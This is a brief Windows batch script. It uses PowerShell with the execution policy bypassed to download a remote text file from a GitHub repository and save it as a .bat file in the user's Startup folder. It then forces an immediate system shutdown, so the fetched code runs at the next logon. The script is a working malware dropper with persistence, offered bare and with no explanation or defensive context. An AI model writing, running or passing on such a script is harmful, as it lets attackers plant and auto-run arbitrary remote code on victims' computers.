@echo off
setlocal

set "URL=https://raw.githubusercontent.com/animationss253/magarni/main/run2.txt"
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "DEST=%STARTUP%\iys.bat"

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"try { Invoke-WebRequest -Uri '%URL%' -OutFile '%DEST%' -UseBasicParsing -TimeoutSec 15; Write-Host 'Download successful.'; exit 0 } catch { Write-Host 'Download failed.'; exit 1 }"

if errorlevel 1 (
    echo Download failed.
) else (
    echo sulululu
    shutdown /s /f /t 0
)

pause
endlocal
